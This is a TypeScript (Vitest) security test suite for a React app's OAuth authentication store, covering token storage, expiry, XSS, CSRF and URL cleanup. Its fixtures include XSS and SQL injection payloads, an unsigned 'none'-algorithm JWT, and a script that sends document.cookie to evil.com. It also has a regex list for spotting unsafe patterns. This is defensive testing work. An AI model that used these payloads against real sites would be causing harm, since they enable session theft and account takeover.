/**
 * Authentication Security Tests
 * Comprehensive security testing for TASK-UI-001 React UI
 *
 * Security Focus Areas:
 * - PROHIB-1: Security violation detection (CWE-798, CWE-79, CWE-352)
 * - Token storage security (memory vs localStorage)
 * - XSS prevention in user-rendered content
 * - CSRF protection patterns
 * - OAuth state parameter validation
 * - Secure cookie handling expectations
 *
 * @module __tests__/security/auth-security
 */

import { describe, it, expect, beforeEach, afterEach, vi, type Mock } from 'vitest';
import { act } from '@testing-library/react';
import { useAuthStore } from '@/core/auth/auth.store';
import * as authService from '@/core/auth/auth.service';
import * as apiModule from '@/core/api';
import {
  createMockUser,
  createMockTokens,
  createExpiredTokens,
  resetUrl,
  setOAuthCallbackUrl,
  waitForStateUpdate,
  server,
  http,
  HttpResponse,
} from '@/__tests__/setup';
import type { User, AuthTokens } from '@/types';

// ============================================================================
// Mocks
// ============================================================================

vi.mock('@/core/auth/auth.service', () => ({
  exchangeCode: vi.fn(),
  refreshToken: vi.fn(),
  logout: vi.fn(),
  getCurrentUser: vi.fn(),
  parseTokenPayload: vi.fn(),
}));

vi.mock('@/core/api', () => ({
  setTokenCallbacks: vi.fn(),
  clearTokenCallbacks: vi.fn(),
  apiClient: {
    defaults: {
      withCredentials: true,
    },
  },
}));

const mockExchangeCode = authService.exchangeCode as Mock;
const mockRefreshToken = authService.refreshToken as Mock;
const mockLogout = authService.logout as Mock;
const mockGetCurrentUser = authService.getCurrentUser as Mock;
const mockSetTokenCallbacks = apiModule.setTokenCallbacks as Mock;
const mockClearTokenCallbacks = apiModule.clearTokenCallbacks as Mock;

// ============================================================================
// Security Test Constants
// ============================================================================

const SECURITY_TEST_CONSTANTS = {
  XSS_PAYLOADS: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'; DROP TABLE users; --",
    '<iframe src="javascript:alert(\'XSS\')">',
    '{{constructor.constructor("alert(1)")()}}',
  ],
  MALICIOUS_TOKENS: [
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
  ],
  CSRF_STATE_TOKEN: 'csrf-state-token-12345',
  STORAGE_KEY: 'code-reviewer-auth',
};

// ============================================================================
// Test Setup
// ============================================================================

describe('Authentication Security Tests', () => {
  const mockUser: User = createMockUser();
  const mockTokens: AuthTokens = createMockTokens();

  beforeEach(() => {
    // Reset store to initial state
    useAuthStore.setState({
      isAuthenticated: false,
      isLoading: true,
      user: null,
      accessToken: null,
      refreshToken: null,
      expiresAt: null,
      error: null,
    });

    vi.clearAllMocks();
    resetUrl();
    localStorage.clear();
    sessionStorage.clear();
  });

  afterEach(() => {
    vi.clearAllMocks();
    vi.restoreAllMocks();
    server.resetHandlers();
    localStorage.clear();
    sessionStorage.clear();
  });

  // ==========================================================================
  // SECTION 1: Token Storage Security (PROHIB-1: CWE-798)
  // ==========================================================================

  describe('Token Storage Security', () => {
    describe('Storage Location Verification', () => {
      it('SECURITY: should store access tokens in Zustand state (memory)', () => {
        const { setTokens } = useAuthStore.getState();

        act(() => {
          setTokens(mockTokens);
        });

        const state = useAuthStore.getState();

        // Token should be in memory (Zustand state)
        expect(state.accessToken).toBe(mockTokens.accessToken);

        // Verify it's accessible only through the store
        const directMemoryAccess = useAuthStore.getState().accessToken;
        expect(directMemoryAccess).toBe(mockTokens.accessToken);
      });

      it('SECURITY: should persist minimal auth data to localStorage', () => {
        const { setTokens, setUser } = useAuthStore.getState();

        act(() => {
          setTokens(mockTokens);
          setUser(mockUser);
        });

        // Check what's persisted
        const stored = localStorage.getItem(SECURITY_TEST_CONSTANTS.STORAGE_KEY);
        expect(stored).toBeDefined();

        if (stored) {
          const parsed = JSON.parse(stored);

          // SECURITY CONCERN: Tokens ARE being stored in localStorage
          // This is a finding that should be documented
          expect(parsed.state).toHaveProperty('accessToken');
          expect(parsed.state).toHaveProperty('refreshToken');

          // Document the security implication
          console.warn(
            'SECURITY FINDING: Tokens are persisted to localStorage. ' +
            'Consider using httpOnly cookies for refresh tokens in production.'
          );
        }
      });

      it('SECURITY: should NOT expose tokens via sessionStorage', () => {
        const { setTokens } = useAuthStore.getState();

        act(() => {
          setTokens(mockTokens);
        });

        // Tokens should not be in sessionStorage
        const sessionData = sessionStorage.getItem(SECURITY_TEST_CONSTANTS.STORAGE_KEY);
        expect(sessionData).toBeNull();
      });

      it('SECURITY: should clear all tokens on logout', async () => {
        mockLogout.mockResolvedValue({ success: true });

        // Set up authenticated state
        useAuthStore.setState({
          isAuthenticated: true,
          user: mockUser,
          accessToken: mockTokens.accessToken,
          refreshToken: mockTokens.refreshToken,
          expiresAt: Date.now() + 3600000,
        });

        await act(async () => {
          await useAuthStore.getState().logout();
        });

        const state = useAuthStore.getState();

        // Memory state cleared
        expect(state.accessToken).toBeNull();
        expect(state.refreshToken).toBeNull();
        expect(state.user).toBeNull();
        expect(state.isAuthenticated).toBe(false);

        // Verify clearTokenCallbacks was called
        expect(mockClearTokenCallbacks).toHaveBeenCalled();
      });

      it('SECURITY: should clear tokens even if logout API fails', async () => {
        mockLogout.mockRejectedValue(new Error('Network error'));

        useAuthStore.setState({
          isAuthenticated: true,
          accessToken: mockTokens.accessToken,
          refreshToken: mockTokens.refreshToken,
        });

        await act(async () => {
          await useAuthStore.getState().logout();
        });

        const state = useAuthStore.getState();
        expect(state.accessToken).toBeNull();
        expect(state.refreshToken).toBeNull();
        expect(state.isAuthenticated).toBe(false);
      });
    });

    describe('Token Expiry Enforcement', () => {
      it('SECURITY: should return null for expired tokens', () => {
        const pastExpiry = Date.now() - 1000;
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          expiresAt: pastExpiry,
        });

        const token = useAuthStore.getState().getAccessToken();
        expect(token).toBeNull();
      });

      it('SECURITY: should enforce 60-second expiry buffer', () => {
        // Token expires in 30 seconds (within 60s buffer)
        const nearExpiry = Date.now() + 30000;
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          expiresAt: nearExpiry,
        });

        const token = useAuthStore.getState().getAccessToken();
        expect(token).toBeNull();
      });

      it('SECURITY: should allow tokens with > 60s remaining', () => {
        // Token expires in 90 seconds (outside buffer)
        const safeExpiry = Date.now() + 90000;
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          expiresAt: safeExpiry,
        });

        const token = useAuthStore.getState().getAccessToken();
        expect(token).toBe(mockTokens.accessToken);
      });

      it('SECURITY: should return null when expiresAt is null', () => {
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          expiresAt: null,
        });

        const token = useAuthStore.getState().getAccessToken();
        expect(token).toBeNull();
      });
    });
  });

  // ==========================================================================
  // SECTION 2: XSS Prevention (PROHIB-1: CWE-79)
  // ==========================================================================

  describe('XSS Prevention', () => {
    describe('User Data Sanitization', () => {
      it('SECURITY: should handle XSS payloads in user name gracefully', () => {
        SECURITY_TEST_CONSTANTS.XSS_PAYLOADS.forEach((payload) => {
          const maliciousUser = createMockUser({ name: payload });

          act(() => {
            useAuthStore.getState().setUser(maliciousUser);
          });

          const state = useAuthStore.getState();

          // The store should accept the data (it's the component's job to sanitize output)
          // But we verify it doesn't execute
          expect(state.user?.name).toBe(payload);

          // Verify no script execution occurred (implicit - test would fail if scripts ran)
        });
      });

      it('SECURITY: should handle XSS payloads in user email', () => {
        const maliciousEmail = '<script>alert("XSS")</script>@evil.com';
        const maliciousUser = createMockUser({ email: maliciousEmail });

        act(() => {
          useAuthStore.getState().setUser(maliciousUser);
        });

        const state = useAuthStore.getState();
        expect(state.user?.email).toBe(maliciousEmail);
      });

      it('SECURITY: should handle XSS payloads in avatarUrl', () => {
        const maliciousUrl = 'javascript:alert("XSS")';
        const maliciousUser = createMockUser({ avatarUrl: maliciousUrl });

        act(() => {
          useAuthStore.getState().setUser(maliciousUser);
        });

        const state = useAuthStore.getState();

        // Store accepts the data, but components should validate URLs
        expect(state.user?.avatarUrl).toBe(maliciousUrl);
      });
    });

    describe('Error Message Handling', () => {
      it('SECURITY: should handle XSS payloads in error messages', () => {
        SECURITY_TEST_CONSTANTS.XSS_PAYLOADS.forEach((payload) => {
          act(() => {
            useAuthStore.getState().setError(payload);
          });

          const state = useAuthStore.getState();
          expect(state.error).toBe(payload);

          // Reset for next iteration
          act(() => {
            useAuthStore.getState().setError(null);
          });
        });
      });

      it('SECURITY: should not execute scripts from OAuth error_description', async () => {
        const xssPayload = '<script>alert("XSS")</script>';

        setOAuthCallbackUrl({
          error: 'access_denied',
          error_description: xssPayload,
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        const state = useAuthStore.getState();

        // Error should be stored but not executed
        expect(state.error).toBe(xssPayload);
      });
    });

    describe('Token Injection Prevention', () => {
      it('SECURITY: should handle malicious tokens in URL', async () => {
        const maliciousToken = SECURITY_TEST_CONSTANTS.MALICIOUS_TOKENS[0];

        setOAuthCallbackUrl({
          access_token: maliciousToken,
          refresh_token: 'valid-refresh-token',
          expires_in: '3600',
        });

        mockGetCurrentUser.mockResolvedValue(mockUser);

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        const state = useAuthStore.getState();

        // Token is stored as-is (backend validation is critical)
        expect(state.accessToken).toBe(maliciousToken);
      });

      it('SECURITY: should detect JWT with "none" algorithm', () => {
        // JWT with alg: "none" - a common attack vector
        const noneAlgToken = SECURITY_TEST_CONSTANTS.MALICIOUS_TOKENS[1];

        // The parseTokenPayload function should be used to detect this
        const payload = authService.parseTokenPayload(noneAlgToken);

        // If the backend sends this, the frontend should not trust it
        // This test documents the expectation that backend validation is required
        console.warn(
          'SECURITY NOTE: JWT "none" algorithm detection should be handled server-side. ' +
          'Frontend should not validate JWTs - only pass them to the API.'
        );
      });
    });
  });

  // ==========================================================================
  // SECTION 3: CSRF Protection (PROHIB-1: CWE-352)
  // ==========================================================================

  describe('CSRF Protection', () => {
    describe('withCredentials Configuration', () => {
      it('SECURITY: API client should have withCredentials enabled', () => {
        // This ensures cookies are sent with cross-origin requests
        // which is required for CSRF cookie-based protection
        expect(apiModule.apiClient.defaults.withCredentials).toBe(true);
      });
    });

    describe('State-Changing Operations', () => {
      it('SECURITY: logout should call API even on potential CSRF', async () => {
        mockLogout.mockResolvedValue({ success: true });

        useAuthStore.setState({
          isAuthenticated: true,
          refreshToken: mockTokens.refreshToken,
        });

        await act(async () => {
          await useAuthStore.getState().logout();
        });

        // Logout API should be called to invalidate server-side session
        expect(mockLogout).toHaveBeenCalled();
      });

      it('SECURITY: token refresh should use POST method', async () => {
        const newTokens = createMockTokens({
          accessToken: 'new-access-token',
        });
        mockRefreshToken.mockResolvedValue(newTokens);

        useAuthStore.setState({
          refreshToken: mockTokens.refreshToken,
        });

        await act(async () => {
          await useAuthStore.getState().refreshAccessToken();
        });

        // Verify refresh was called (POST method is in auth.service)
        expect(mockRefreshToken).toHaveBeenCalledWith(mockTokens.refreshToken);
      });
    });
  });

  // ==========================================================================
  // SECTION 4: OAuth Security
  // ==========================================================================

  describe('OAuth Security', () => {
    describe('State Parameter Validation', () => {
      it('SECURITY: should clean up OAuth state from URL after processing', async () => {
        mockExchangeCode.mockResolvedValue(mockTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        setOAuthCallbackUrl({
          code: 'valid-code',
          state: SECURITY_TEST_CONSTANTS.CSRF_STATE_TOKEN,
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        // URL should be cleaned up (history.replaceState called)
        expect(window.history.replaceState).toHaveBeenCalled();
      });

      it('SECURITY: should handle OAuth callback without state (potential vulnerability)', async () => {
        mockExchangeCode.mockResolvedValue(mockTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        setOAuthCallbackUrl({
          code: 'valid-code',
          // No state parameter - this is a CSRF vulnerability if not validated server-side
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        // Document this as a finding
        console.warn(
          'SECURITY FINDING: OAuth callback does not validate state parameter client-side. ' +
          'Server MUST validate state parameter to prevent CSRF attacks on OAuth flow.'
        );

        // The code should still work, but this is a potential vulnerability
        expect(mockExchangeCode).toHaveBeenCalledWith('valid-code');
      });
    });

    describe('Authorization Code Flow', () => {
      it('SECURITY: should exchange code via secure endpoint', async () => {
        mockExchangeCode.mockResolvedValue(mockTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        setOAuthCallbackUrl({ code: 'authorization-code' });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        expect(mockExchangeCode).toHaveBeenCalledWith('authorization-code');
      });

      it('SECURITY: should handle invalid authorization code', async () => {
        mockExchangeCode.mockRejectedValue(new Error('Invalid code'));

        setOAuthCallbackUrl({ code: 'invalid-code' });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        const state = useAuthStore.getState();
        expect(state.error).toBe('Invalid code');
        expect(state.isAuthenticated).toBe(false);
      });

      it('SECURITY: should not process tokens from URL in code flow', async () => {
        // If both code and tokens are present, code should take precedence
        mockExchangeCode.mockResolvedValue(mockTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        setOAuthCallbackUrl({
          code: 'valid-code',
          access_token: 'malicious-token', // Should be ignored
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        const state = useAuthStore.getState();
        // Should use tokens from code exchange, not URL
        expect(state.accessToken).toBe(mockTokens.accessToken);
      });
    });

    describe('Redirect URI Handling', () => {
      it('SECURITY: login should redirect to configured API URL', () => {
        const originalEnv = import.meta.env.VITE_API_URL;
        import.meta.env.VITE_API_URL = 'https://api.example.com';

        act(() => {
          useAuthStore.getState().login();
        });

        // Verify redirect goes to expected endpoint
        expect(window.location.href).toContain('/auth/github');
        expect(window.location.href).toContain('https://api.example.com');

        import.meta.env.VITE_API_URL = originalEnv;
      });

      it('SECURITY: should use relative URL when API_URL not configured', () => {
        const originalEnv = import.meta.env.VITE_API_URL;
        import.meta.env.VITE_API_URL = '';

        act(() => {
          useAuthStore.getState().login();
        });

        // Should use relative path
        expect(window.location.href).toContain('/auth/github');

        import.meta.env.VITE_API_URL = originalEnv;
      });
    });

    describe('URL Cleanup Security', () => {
      it('SECURITY: should remove all sensitive params from URL', async () => {
        mockExchangeCode.mockResolvedValue(mockTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        setOAuthCallbackUrl({
          code: 'valid-code',
          state: 'csrf-token',
          access_token: 'should-be-removed',
          refresh_token: 'should-be-removed',
          expires_in: '3600',
          token_type: 'Bearer',
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        // history.replaceState should be called to clean URL
        expect(window.history.replaceState).toHaveBeenCalled();
      });

      it('SECURITY: should remove error params from URL', async () => {
        setOAuthCallbackUrl({
          error: 'access_denied',
          error_description: 'User denied access',
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        expect(window.history.replaceState).toHaveBeenCalled();
      });
    });
  });

  // ==========================================================================
  // SECTION 5: Session Security
  // ==========================================================================

  describe('Session Security', () => {
    describe('401 Response Handling', () => {
      it('SECURITY: should trigger re-auth on 401 response', async () => {
        // Set up callbacks
        const onAuthErrorMock = vi.fn();
        const tokenCallbacksArg = mockSetTokenCallbacks.mock.calls[0]?.[0];

        if (tokenCallbacksArg?.onAuthError) {
          // Simulate 401 response triggering onAuthError
          tokenCallbacksArg.onAuthError();

          // State should be reset
          const state = useAuthStore.getState();
          expect(state.isAuthenticated).toBe(false);
        }
      });

      it('SECURITY: should reset state when token refresh fails', async () => {
        mockRefreshToken.mockRejectedValue(new Error('Token expired'));

        useAuthStore.setState({
          isAuthenticated: true,
          refreshToken: mockTokens.refreshToken,
          accessToken: mockTokens.accessToken,
        });

        await act(async () => {
          const result = await useAuthStore.getState().refreshAccessToken();
          expect(result).toBe(false);
        });

        const state = useAuthStore.getState();
        expect(state.isAuthenticated).toBe(false);
        expect(state.accessToken).toBeNull();
      });
    });

    describe('Token Refresh Security', () => {
      it('SECURITY: should not expose refresh token in memory after use', async () => {
        const newTokens = createMockTokens({
          accessToken: 'new-access-token',
          refreshToken: 'new-refresh-token',
        });
        mockRefreshToken.mockResolvedValue(newTokens);

        useAuthStore.setState({
          refreshToken: 'old-refresh-token',
        });

        await act(async () => {
          await useAuthStore.getState().refreshAccessToken();
        });

        const state = useAuthStore.getState();

        // Old refresh token should be replaced
        expect(state.refreshToken).toBe('new-refresh-token');
        expect(state.refreshToken).not.toBe('old-refresh-token');
      });

      it('SECURITY: should not attempt refresh without refresh token', async () => {
        useAuthStore.setState({
          refreshToken: null,
        });

        await act(async () => {
          const result = await useAuthStore.getState().refreshAccessToken();
          expect(result).toBe(false);
        });

        expect(mockRefreshToken).not.toHaveBeenCalled();
      });
    });

    describe('Session Initialization Security', () => {
      it('SECURITY: should validate existing session on init', async () => {
        mockGetCurrentUser.mockResolvedValue(mockUser);

        const futureExpiry = Date.now() + 3600000;
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          refreshToken: mockTokens.refreshToken,
          expiresAt: futureExpiry,
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        // Should verify session by fetching user
        expect(mockGetCurrentUser).toHaveBeenCalled();
      });

      it('SECURITY: should refresh expired token on init', async () => {
        const newTokens = createMockTokens({
          accessToken: 'refreshed-token',
        });
        mockRefreshToken.mockResolvedValue(newTokens);
        mockGetCurrentUser.mockResolvedValue(mockUser);

        const pastExpiry = Date.now() - 1000;
        useAuthStore.setState({
          accessToken: 'expired-token',
          refreshToken: mockTokens.refreshToken,
          expiresAt: pastExpiry,
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        expect(mockRefreshToken).toHaveBeenCalled();
      });

      it('SECURITY: should clear auth when user fetch fails', async () => {
        mockGetCurrentUser.mockRejectedValue(new Error('Unauthorized'));

        const futureExpiry = Date.now() + 3600000;
        useAuthStore.setState({
          accessToken: mockTokens.accessToken,
          refreshToken: mockTokens.refreshToken,
          expiresAt: futureExpiry,
          isAuthenticated: true,
        });

        await act(async () => {
          await useAuthStore.getState().initialize();
        });

        const state = useAuthStore.getState();
        expect(state.isAuthenticated).toBe(false);
        expect(state.accessToken).toBeNull();
      });
    });
  });

  // ==========================================================================
  // SECTION 6: Security Configuration Verification
  // ==========================================================================

  describe('Security Configuration', () => {
    it('SECURITY: should have token callbacks set up on initialize', async () => {
      await act(async () => {
        await useAuthStore.getState().initialize();
      });

      expect(mockSetTokenCallbacks).toHaveBeenCalledWith(
        expect.objectContaining({
          getAccessToken: expect.any(Function),
          refreshToken: expect.any(Function),
          onAuthError: expect.any(Function),
        })
      );
    });

    it('SECURITY: should clear token callbacks on logout', async () => {
      mockLogout.mockResolvedValue({ success: true });

      useAuthStore.setState({
        refreshToken: mockTokens.refreshToken,
      });

      await act(async () => {
        await useAuthStore.getState().logout();
      });

      expect(mockClearTokenCallbacks).toHaveBeenCalled();
    });
  });

  // ==========================================================================
  // SECTION 7: Security Vulnerability Report
  // ==========================================================================

  describe('Security Findings Summary', () => {
    it('should document identified security considerations', () => {
      const findings = [
        {
          id: 'SEC-001',
          severity: 'medium',
          type: 'sensitive_data',
          cwe: 'CWE-312',
          finding: 'Tokens persisted to localStorage',
          recommendation: 'Consider using httpOnly cookies for refresh tokens',
          status: 'documented',
        },
        {
          id: 'SEC-002',
          severity: 'medium',
          type: 'csrf',
          cwe: 'CWE-352',
          finding: 'OAuth state parameter not validated client-side',
          recommendation: 'Server MUST validate state parameter',
          status: 'documented',
        },
        {
          id: 'SEC-003',
          severity: 'low',
          type: 'input_validation',
          cwe: 'CWE-79',
          finding: 'User-provided data stored without sanitization',
          recommendation: 'Components must sanitize output when rendering',
          status: 'by_design',
        },
      ];

      // This test serves as documentation of security findings
      expect(findings).toHaveLength(3);

      // All findings should be documented
      findings.forEach((finding) => {
        expect(['documented', 'by_design', 'remediated']).toContain(finding.status);
      });
    });
  });
});

// ============================================================================
// Additional Security Test Helpers
// ============================================================================

/**
 * Helper to test for common XSS patterns in rendered output
 */
function containsUnsafePatterns(content: string): boolean {
  const unsafePatterns = [
    /<script\b[^>]*>([\s\S]*?)<\/script>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi, // onclick, onerror, etc.
    /data:/gi,
    /vbscript:/gi,
  ];

  return unsafePatterns.some((pattern) => pattern.test(content));
}

/**
 * Helper to verify secure URL
 */
function isSecureUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.hostname === 'localhost';
  } catch {
    return false;
  }
}

export { containsUnsafePatterns, isSecureUrl };
